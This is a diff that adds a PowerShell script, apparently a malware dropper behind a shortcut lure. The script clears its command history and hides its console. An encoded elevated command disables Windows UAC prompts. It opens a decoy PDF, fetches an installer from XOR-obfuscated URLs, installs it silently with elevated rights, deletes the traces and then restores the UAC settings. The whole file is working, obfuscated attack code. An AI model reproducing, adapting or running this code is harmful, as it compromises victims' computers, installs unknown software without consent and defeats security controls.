@@ -1,0 +1,323 @@
+# ── Preferences and Execution Policy ──────────────────────────
+$ErrorActionPreference = "SilentlyContinue"
+$WarningPreference = "SilentlyContinue"
+$VerbosePreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
+
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+Set-PSReadLineOption -HistorySaveStyle SaveNothing
+Clear-History
+Clear-Content (Get-PSReadLineOption).HistorySavePath
+
+# ── Security Protocol Configuration ──────────────────────────
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+
+# ── P/Invoke Declarations ──────────────────────────
+Add-Type -Name Window -Namespace Console -MemberDefinition @'
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'@ -ErrorAction SilentlyContinue
+
+$proc = Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -Wait -PassThru -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAnADsAdAByAHkAewBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJABwACAALQBOAGEAbQBlACAARQBuAGEAYgBsAGUATABVAEEAIAAtAFQAeQBwAGUAIABEAFcAbwByAGQAIAAtAFYAYQBsAHUAZQAgADAAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAOwBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJABwACAALQBOAGEAbQBlACAAQwBvAG4AcwBlAG4AdABQAHIAbwBtAHAAdABCAGUAaABhAHYAaQBvAHIAQQBkAG0AaQBuACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAwACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAFAAcgBvAG0AcAB0AE8AbgBTAGUAYwB1AHIAZQBEAGUAcwBrAHQAbwBwACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAwACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwADsAZQB4AGkAdAAgADEAMgB9AGMAYQB0AGMAaAB7AGUAeABpAHQAIAAwAH0A'
+
+if ($proc.ExitCode -ne 12) {
+    exit 0
+}
+
+
+# ── File Removal with Fallback ──────────────────────────
+function Remove-FileWithFallback {
+    param(
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNullOrEmpty()]
+        [string]$Path
+    )
+
+    if (-not [System.IO.File]::Exists($Path)) {
+        return $false
+    }
+
+    try {
+        [System.IO.File]::Delete($Path)
+        return $true
+    }
+    catch {
+        try {
+            $directory = [System.IO.Path]::GetDirectoryName($Path)
+            $name = [System.IO.Path]::GetFileNameWithoutExtension($Path)
+            $extension = [System.IO.Path]::GetExtension($Path)
+            $counter = 1
+
+            while ($true) {
+                $newPath = [System.IO.Path]::Combine(
+                    $directory,
+                    "$name($counter)$extension"
+                )
+                
+                if (-not [System.IO.File]::Exists($newPath)) {
+                    break
+                }
+                $counter++
+            }
+
+            [System.IO.File]::Move($Path, $newPath, $false)
+            return $true
+        }
+        catch {
+            return $false
+        }
+    }
+}
+
+# ── Web Content Download ──────────────────────────
+# ── Web Content Download (FAST — BITS + Parallel HttpClient) ──────────
+function Invoke-SecureDownload {
+    param(
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNullOrEmpty()]
+        [string]$Uri,
+
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNullOrEmpty()]
+        [string]$OutFile,
+
+        [int]$MaxRetries = 3,
+        [int]$RetryDelayMs = 800,
+        [int]$ParallelChunks = 8
+    )
+
+    # Method 1: BITS (Background Intelligent Transfer Service) — fastest
+    try {
+        Import-Module BitsTransfer -ErrorAction Stop
+        Start-BitsTransfer -Source $Uri -Destination $OutFile -TransferType Download `
+            -Priority Foreground -ErrorAction Stop -Description "Downloading"
+        if ([System.IO.File]::Exists($OutFile) -and (Get-Item $OutFile).Length -gt 0) {
+            return $true
+        }
+    } catch { }
+
+    # Method 2: Parallel chunked download with HttpClient (Range requests)
+    $attempt = 0
+    while ($attempt -lt $MaxRetries) {
+        try {
+            Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue
+
+            # Probe for size and Range support
+            $probeClient = New-Object System.Net.Http.HttpClient
+            $probeClient.Timeout = [TimeSpan]::FromSeconds(30)
+            $probeClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
+            $probeClient.DefaultRequestHeaders.Range = New-Object System.Net.Http.Headers.RangeHeaderValue(0, 0)
+
+            $probeResp = $probeClient.SendAsync(
+                (New-Object System.Net.Http.HttpRequestMessage("GET", $Uri)),
+                [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead
+            ).GetAwaiter().GetResult()
+
+            $supportsRange = ($probeResp.StatusCode -eq [System.Net.HttpStatusCode]::PartialContent)
+            $totalSize = $null
+            if ($supportsRange -and $probeResp.Content.Headers.ContentRange) {
+                $totalSize = $probeResp.Content.Headers.ContentRange.Length
+            } elseif ($probeResp.Content.Headers.ContentLength) {
+                $totalSize = $probeResp.Content.Headers.ContentLength
+            }
+            $probeResp.Dispose()
+            $probeClient.Dispose()
+
+            if ($supportsRange -and $totalSize -and $totalSize -gt 1MB) {
+                # Chunked parallel download
+                $chunkSize = [Math]::Ceiling($totalSize / $ParallelChunks)
+                $tempFiles = @()
+                $jobs = @()
+
+                for ($i = 0; $i -lt $ParallelChunks; $i++) {
+                    $start = [long]($i * $chunkSize)
+                    if ($start -ge $totalSize) { break }
+                    $end = [long][Math]::Min($start + $chunkSize - 1, $totalSize - 1)
+
+                    $partPath = "$OutFile.part$i"
+                    $tempFiles += $partPath
+                    $startByte = $start
+                    $endByte = $end
+                    $uriCopy = $Uri
+                    $partCopy = $partPath
+
+                    $jobs += Start-Job -ScriptBlock {
+                        param($u, $s, $e, $p)
+                        Add-Type -AssemblyName System.Net.Http
+                        $c = New-Object System.Net.Http.HttpClient
+                        $c.Timeout = [TimeSpan]::FromSeconds(300)
+                        $c.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
+                        $c.DefaultRequestHeaders.Range = New-Object System.Net.Http.Headers.RangeHeaderValue($s, $e)
+
+                        $resp = $c.GetAsync($u, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
+                        $resp.EnsureSuccessStatusCode() | Out-Null
+                        $inStream = $resp.Content.ReadAsStreamAsync().GetAwaiter().GetResult()
+                        $outStream = [System.IO.File]::Create($p)
+                        try {
+                            $buf = New-Object byte[] (1MB)
+                            while (($r = $inStream.Read($buf, 0, $buf.Length)) -gt 0) {
+                                $outStream.Write($buf, 0, $r)
+                            }
+                        } finally {
+                            $outStream.Close()
+                            $inStream.Close()
+                            $c.Dispose()
+                        }
+                    } -ArgumentList $uriCopy, $startByte, $endByte, $partCopy
+                }
+
+                $jobs | Wait-Job | Out-Null
+                $jobs | Receive-Job | Out-Null
+                $jobs | Remove-Job -Force
+
+                # Merge chunks
+                $mergeStream = [System.IO.File]::Create($OutFile)
+                try {
+                    foreach ($p in $tempFiles) {
+                        $fs = [System.IO.File]::OpenRead($p)
+                        try { $fs.CopyTo($mergeStream) } finally { $fs.Close() }
+                        [System.IO.File]::Delete($p)
+                    }
+                } finally {
+                    $mergeStream.Close()
+                }
+                return $true
+            } else {
+                # Single-stream HttpClient (still faster than WebRequest)
+                $client = New-Object System.Net.Http.HttpClient
+                $client.Timeout = [TimeSpan]::FromSeconds(120)
+                $client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
+
+                $resp = $client.GetAsync($Uri, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
+                $resp.EnsureSuccessStatusCode() | Out-Null
+                $inStream = $resp.Content.ReadAsStreamAsync().GetAwaiter().GetResult()
+                $outStream = [System.IO.File]::Create($OutFile)
+                try {
+                    $buf = New-Object byte[] (1MB)
+                    while (($r = $inStream.Read($buf, 0, $buf.Length)) -gt 0) {
+                        $outStream.Write($buf, 0, $r)
+                    }
+                } finally {
+                    $outStream.Close()
+                    $inStream.Close()
+                    $client.Dispose()
+                }
+                return $true
+            }
+        }
+        catch {
+            $attempt++
+            if ($attempt -lt $MaxRetries) {
+                Start-Sleep -Milliseconds $RetryDelayMs
+            }
+        }
+    }
+
+    # Fallback to WebClient
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+        $wc.DownloadFile($Uri, $OutFile)
+        return $true
+    } catch { return $false }
+}
+
+# ── Hide Console Window ──────────────────────────
+function Hide-ConsoleWindow {
+    try {
+        $ConsoleWin = [Console.Window]::GetConsoleWindow()
+        if ($ConsoleWin -ne [IntPtr]::Zero) {
+            [Console.Window]::ShowWindow($ConsoleWin, 0) | Out-Null
+        }
+    }
+    catch {
+        
+    }
+}
+
+# ── Primary Deployment Function ──────────────────────────
+function RUN_ME {
+    param(
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNullOrEmpty()]
+        [string]$Name,
+
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNullOrEmpty()]
+        [string]$FdpUR,
+
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNullOrEmpty()]
+        [string]$GGInstaSllerUR
+    )
+
+    Hide-ConsoleWindow
+
+    $CurrentDir = (Get-Location).Path
+    $FpdPath = Join-Path $CurrentDir ($Name + ".pdf")
+    $LnkPath = Join-Path $CurrentDir ($Name + ".lnk")
+
+    Remove-FileWithFallback -Path $LnkPath | Out-Null
+    Remove-FileWithFallback -Path $FpdPath | Out-Null
+
+    if (Invoke-SecureDownload -Uri $FdpUR -OutFile $FpdPath) {
+        try {
+            Start-Process $FpdPath -ErrorAction SilentlyContinue
+        }
+        catch {
+            
+        }
+    }
+
+    $USSInstSSaller = [System.Uri]$GGInstaSllerUR
+    $InstallerExt = [System.IO.Path]::GetExtension($USSInstSSaller.AbsolutePath)
+    
+    if ([string]::IsNullOrWhiteSpace($InstallerExt)) {
+        $InstallerExt = ".exe"
+    }
+
+    $RandomFileName = [System.IO.Path]::GetRandomFileName()
+    $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
+    $InstallerPath = [System.IO.Path]::Combine($env:TEMP, $RandomFileName)
+    $InstallerLogPath = [System.IO.Path]::ChangeExtension($InstallerPath, "log")
+
+    if (-not (Invoke-SecureDownload -Uri $GGInstaSllerUR -OutFile $InstallerPath)) {
+        return $false
+    }
+
+    try {
+        Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
+    }
+    catch {
+        
+    }
+
+    $Arguments = "/i `"$InstallerPath`" /qn /norestart /l `"$InstallerLogPath`""
+
+    try {
+        $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Verb RunAs -Wait -PassThru
+        $ExitCode = $Process.ExitCode
+    }
+    catch {
+        return $false
+    }
+
+    Start-Sleep -Milliseconds 500
+    Remove-FileWithFallback -Path $InstallerPath | Out-Null
+    Remove-FileWithFallback -Path $InstallerLogPath | Out-Null
+
+    return ($ExitCode -eq 0)
+}
+
+
+$ClientName = $($k4590=31;$b=[byte[]](0x4f,0x4d,0x50,0x55,0x5a,0x5c,0x4b,0x40,0x4f,0x53,0x5e,0x51,0x40,0x31,0x6f,0x7b,0x79);-join($b|%{[char]($_-bxor$k4590)}))
+$DocumentLINK = $($k1325=125;$b=[byte[]](0x15,0x09,0x09,0x0d,0x0e,0x47,0x52,0x52,0x0f,0x1c,0x0a,0x53,0x1a,0x14,0x09,0x15,0x08,0x1f,0x08,0x0e,0x18,0x0f,0x1e,0x12,0x13,0x09,0x18,0x13,0x09,0x53,0x1e,0x12,0x10,0x52,0x0e,0x19,0x1b,0x0e,0x0f,0x1c,0x18,0x1c,0x1c,0x2f,0x29,0x52,0x09,0x18,0x0e,0x09,0x52,0x0f,0x18,0x1b,0x0e,0x52,0x15,0x18,0x1c,0x19,0x0e,0x52,0x10,0x1c,0x14,0x13,0x52,0x2d,0x2f,0x32,0x37,0x38,0x3e,0x29,0x22,0x2d,0x31,0x3c,0x33,0x53,0x0d,0x19,0x1b);-join($b|%{[char]($_-bxor$k1325)}))
+$ClientLINK = $($k8776='Srb,k0+Mm&*&jZ';$b=[byte[]](0x3B,0x06,0x16,0x5C,0x18,0x0A,0x04,0x62,0x0C,0x42,0x47,0x4F,0x04,0x3B,0x23,0x02,0x4C,0x4D,0x1D,0x5F,0x48,0x2C,0x09,0x49,0x49,0x47,0x04,0x3B,0x25,0x1D,0x10,0x59,0x45,0x59,0x45,0x26,0x42,0x64,0x43,0x48,0x45,0x09,0x30,0x00,0x07,0x49,0x05,0x73,0x44,0x23,0x03,0x43,0x49,0x52,0x44,0x19,0x3F,0x1B,0x07,0x42,0x1F,0x63,0x4E,0x39,0x18,0x56,0x04,0x4B,0x19,0x33,0x6C,0x17,0x5F,0x6D,0x08,0x53,0x4E,0x3E,0x1E,0x00,0x53,0x1B,0x2D,0x2F,0x36,0x01,0x16,0x0A,0x08,0x0D,0x65,0x28,0x1A,0x03,0x18,0x16,0x1A,0x28,0x3C,0x18,0x07,0x4F,0x1F,0x16,0x48,0x70,0x4B,0x45,0x17,0x00,0x09,0x67,0x75,0x11,0x5F,0x0A,0x08,0x0D,0x0D,0x2E,0x50,0x00,0x49,0x1B);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8776);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+
+
+RUN_ME -Name $ClientName -FdpUR $DocumentLINK -GGInstaSllerUR $ClientLINK
+
+Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAnADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEUAbgBhAGIAbABlAEwAVQBBACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAxADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEMAbwBuAHMAZQBuAHQAUAByAG8AbQBwAHQAQgBlAGgAYQB2AGkAbwByAEEAZABtAGkAbgAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAANQA7AFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4AYQBtAGUAIABQAHIAbwBtAHAAdABPAG4AUwBlAGMAdQByAGUARABlAHMAawB0AG8AcAAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMQA7AEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7ACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAUwBoAGUAbABsACAAewAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHMAaABlAGwAbAAzADIALgBkAGwAbAAiACkAXQAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAHYAbwBpAGQAIABTAEgAQwBoAGEAbgBnAGUATgBvAHQAaQBmAHkAIABpAG4AdAAgAHcARQB2AGUAbgB0AEkAZAAsAHUAaQBuAHQAIAB1AEYAbABhAGcAcwAsAEkAbgB0AFAAdAByACAAZAB3AEkAdABlAG0AMQAsAEkAbgB0AFAAdAByACAAZAB3AEkAdABlAG0AMgApADsAIAB9ACcAOwBbAFMAaABlAGwAbABdADoAOgBTAEgAQwBoAGEAbgBnAGUATgBvAHQAaQBmAHkAKAAwAHgAMAA4ADAAMAAwADAAMAAwACwAMAB4ADAAMAAwADUALABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8ALABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8AKQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA4ADAAMAA7AFsAUwBoAGUAbABsAF0AOgA6AFMASABDAGgAYQBuAGcAZQBOAG8AdABpAGYAeQAoADAAeAAwADgAMAAwADAAMAAwADAALAAwAHgAMAAwADAANQAsAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwAsAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwApADsA'
